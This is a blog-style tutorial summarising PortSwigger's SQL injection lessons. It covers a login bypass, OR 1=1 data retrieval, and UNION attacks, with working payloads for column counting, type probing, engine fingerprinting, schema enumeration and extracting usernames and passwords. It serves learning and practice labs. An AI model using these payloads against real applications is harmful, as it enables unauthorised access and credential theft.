---
title: "Wrap-up for some simple SQL Injection methods"
date: "2021-12-20"
author: "RealFakeAccount"
description: "Some basic methods for SQL injection."
---

> This blog is basically a conculsion of [this protswigger's tutorial](https://portswigger.net/web-security/sql-injection)

# What is SQL Injection?

![A picture from the protswigger's tutorial](https://portswigger.net/web-security/images/sql-injection.svg)

Watch this video and search online. This blog is not an introduction.

<iframe width="560" height="315" src="https://www.youtube.com/embed/_jKylhJtPmI" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

# SQL injection types

## SQL injection point is the same as exploitation point

### Change application logic

> this is the "Subverting application logic" chapter of the [protswigger's tutorial](https://portswigger.net/web-security/sql-injection)

This is the basic type of SQL injection. Like in all the tutorials, consider the application use the following as authentication:

```sql
 SELECT * FROM users WHERE username = '$_GET['username']' AND password = '$_GET['password']' 
```

By setting username to `administrator'--`, we can set the above SQL query as:

```sql
 SELECT * FROM users WHERE username = '`administrator'--' AND password = '$_GET['password']' 
```

which allows us to login as as administrator.

### Retrieving data from the database

> this is the "Retrieving hidden data" chapter of the [protswigger's tutorial](https://portswigger.net/web-security/sql-injection)

By adding `OR 1=1`, you can retrieve everything from the database and ignore the possible `WHERE` clauses.

For example, consider the following SQL query:

```sql
SELECT * FROM products WHERE category = '$_GET['user_select']' AND released = 1 
```

We set our `user_select` to `Gifts' OR 1=1--`, so the above query becomes:

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1 
```

We can see the `AND released = 1` is ignored, and products from every category are returned.


## SQL injection point is the (potentially) not same as exploitation point

### Retrieving data from other databases

> this is the "Retrieving data from other database tables" chapter of the [protswigger's tutorial](https://portswigger.net/web-security/sql-injection)

Let's say the application stores two databases: `credentials` for user credential and `products` for products display.

You find the page that rely on `products` database has sql injection vulnerability, but you want to retrieve data from `credentials` database.

You have known that the `credentials` database contains two tables: `username` and `password`.

You can use `UNION` attack to do that. For example, 

```sql
SELECT name, price FROM products WHERE category = '$_GET['user_select']'
```

We set our `user_select` to `'UNION SELECT username, password FROM credentials--`, so the above query becomes:

```sql
SELECT name, price FROM products WHERE category = ''UNION SELECT username, password FROM credentials--'
```

which hopefully returns the username and password from `credentials` database.

See [Union attack](#union-attack) for more details.

### Stored SQL injection

![A picture from the protswigger's tutorial](https://portswigger.net/web-security/images/second-order-sql-injection.svg)

Google for more information.

# SQL injection techniques

## Union attack

> this is the "SQL injection UNION attacks" chapter of the [protswigger's tutorial](https://portswigger.net/web-security/sql-injection/union-attacks)

> We will use the same example as above. the application stores two databases:  `credentials` for user credential and `products` for products display.
> You find the page that rely on `products` database has sql injection vulnerability, but you want to retrieve data from `credentials` database.
> You have known that the `credentials` database contains two tables: `username` and `password`.

Union attack is very useful when you need to [Retrieving data from other databases](#retrieving-data-from-other-databases).
`UNION` is a SQL keyword that allows you to combine two or more SQL queries. For more details, see <https://www.w3schools.com/sql/sql_union.asp>

However, there's a few limits to using `UNION`. 

1. the datatype of each column must be the same.

for example, 

```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2 
```

this query is valid if `abcd`'s datatype is `VARCHAR`, but not valid if one of `abcd`'s datatype is `SET`.

2. the column numbers must be the same.

for example, the following two queries are ok, since they both select two columns:

```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2 
```

However, the following query is not ok, since one select two columns and the other select three columns:

```sql
SELECT a, b FROM table1 UNION SELECT c, d, e FROM table2 
```

3. we need to know the name of table2 and columns name of table2

This is not related to UNION keyword but to our exploit. 


### Bypass limit 1: the the datatype

Luckily, `NULL` in sql is compatible with any datatype. So no matter what datatypes of `ab` are, the following query is valid:

```sql
SELECT a, b FROM table1 UNION SELECT NULL, NULL FROM table2 
```

But since we need to retrieve data instead of getting the query right, we need some methods to determine the datatype of `ab`.

#### Find a specify datatype among columns

Use [Null keyword method](#bypass-limit-1:-the-the-datatype) to find your desired datatype.

Let's say you want to find the string column of the original query.

You can do 

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'-- 
```

Any query that does not generate error indicates that the column is a string.

#### Combine multiple value into single column

Let's say there is only one column which is char type, and what you need is char type.

What you cna do is to concatenate string.

You can do this by using `||` or `+`, depends on the sql engine.

For example,

```
 ' UNION SELECT username || '~' || password FROM users-- 
```

### Bypass limit 2: the column numbers

We need a way to check the number of the columns in original query.

There are two common ways to do that:

#### Use NULL keyword

Since `NULL` is [compatible with any datatype](#bypass-limit-1:-the-the-datatype), we can increase the number of `NULL`s each turn and see if the query is valid.

Let's say the original query is:
```sql
SELECT name, price FROM products WHERE category = '$_GET['user_select']'
```

The attack payload looks like this:

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

If line 1 and line 3 crash the page but line 2 doesn't, then the number of columns in the original query is 2.
This is because

```sql
SELECT name, price FROM products WHERE category = '' UNION SELECT NULL,NULL--'
```

is valid while

```sql
SELECT name, price FROM products WHERE category = '' UNION SELECT NULL--'
```
or
```sql
SELECT name, price FROM products WHERE category = '' UNION SELECT NULL,NULL,NULL--'
```

are not.

> Note that in Oracle, you have to specify a table for each SELECT keyword, so none of the above queries are valid.
> Luckily, a build-in table called DUAL can be used for this purpose.
> So the injected queries on Oracle would need to look like: ' UNION SELECT NULL FROM DUAL--. 

#### Use `ORDER BY` keyword

Each column in a SELECT statement got an index starting from 1, and if we use ORDER BY on an non-existing index, database will return an error.

We can use this feature to check the number of columns in the original query.

Let's say the original query is:
```sql
SELECT name, price FROM products WHERE category = '$_GET['user_select']'
```

The attack payload looks like this:

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

If line 3 crash the page but line 2 doesn't, then the number of columns in the original query is 2.
This is because

```sql
SELECT name, price FROM products WHERE category = '' ORDER BY 2--'
```

is valid (the index of name is 1 and price is 2) while

```sql
SELECT name, price FROM products WHERE category = '' ORDER BY 3--'
```

is NOT valid(there are only two column selected).

Order By is more versatile (you don't have to worry about oracle) and you can apply binary search on it.

### Bypass limit 3: the table name and the column name

In order to find which method we need to get those names, we first need to get our sql engine version. 

#### getting the sql engine version

We can use following query to get the sql engine version:
|Engine|Query|
|---|---|
|Oracle | SELECT banner FROM v$version|
|Microsoft SQL Server | SELECT @@version|
|MySQL | SELECT @@VERSION|
|PostgreSQL | SELECT version()|


#### getting database contents

After we know the sql engine version, we can query the contents based on following table.

|Engine|Query|
|---|---|---|
|Oracle | SELECT * FROM all_tables |SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'|
|Microsoft | SELECT * FROM information_schema.tables | SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'|
|PostgreSQL | SELECT * FROM information_schema.tables | SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'|
|MySQL | SELECT * FROM information_schema.tables | SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'|

If you cannot select everything, you can google for the column names in these default tables and select those you needed.

For example, one possible payload to get the database content for non-oracle sql engine is:

```sql
 UNION SELECT table_name, NULL FROM information_schema.tables--
```

### wrap up: retrive `credentials` database from `products` database SQL injection

First of all, we can guess the sql query of `products` is something like SELECT _something_ FROM _something_ WHERE _something_ = '$_GET['user_select']'.

In order to retrive informations from `credentials`, we need to:

1. find the table name and column name you want to retrieve.

See [Bypass limit 3: the table name and the column name](#bypass-limit-3:-the-table-name-and-the-column-name) for details.

Let's assume our desired database name is `credentials` and the desired column names are `username` and `password`.

2. find the column number of the `SELECT`.

We can apply what we learnt in [Bypass limit 2](#bypass-limit-2:-the-column-numbers) 

Assume we find the column number of `SELECT` is 2. Insert this information into the original query, we get:
SELECT _what_,_what_ FROM _something_ WHERE _something_ = '$_GET['user_select']'.

3. find which column's datatype is your desired.

We can safely assume the datatype of the `username` and `password` are char.
So we need to find which column in the original query is char.

Apply what we learnt in [Find a specify datatype among columns](#find-a-specify-datatype-among-columns) here.

If only one column has the desired datatype but you have multiple column to retrieve, use `||` or `+` to concatenate the string as stated above.

Assume both of columns in our example is char type. Then we get
SELECT char, char FROM _something_ WHERE _something_ = '$_GET['user_select']'.

4. use union to retrieve the desired information.

one possible payload:

```sql
' UNION SELECT username, password FROM credentials-- 
```

Finally, the original query will become

```sql
SELECT char, char FROM something WHERE something1 = '' UNION SELECT username, password FROM credentials-- '.
```

The returned table, if we are lucky, will contain the username and password.

# External resources

## Knowledge

[SQL Cheatsheet by protswigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

[SQL injection Tutorial](https://portswigger.net/web-security/sql-injection)

[Blind injection](https://portswigger.net/web-security/sql-injection/blind)

## Practice

[SQL injection Tutorial](https://portswigger.net/web-security/sql-injection)

[SQLi labs](https://github.com/Audi-1/sqli-labs)

[picoCTF](https://play.picoctf.org/practice)